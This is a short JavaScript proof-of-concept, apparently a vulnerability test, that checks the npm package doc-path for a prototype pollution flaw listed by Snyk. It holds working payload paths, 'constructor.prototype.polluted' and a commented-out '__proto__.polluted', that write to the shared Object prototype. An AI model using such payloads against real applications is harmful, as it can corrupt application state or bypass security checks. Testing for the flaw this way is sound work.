// //https://snyk.io/vuln/SNYK-JS-DOCPATH-1011952
// test("prototype pollution in doc-path", () => {
  const path = require("doc-path");
  let obj = {};

console.log({}.polluted);
path.setPath({}, "constructor.prototype.polluted", "yes");
  //path.setPath({}, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
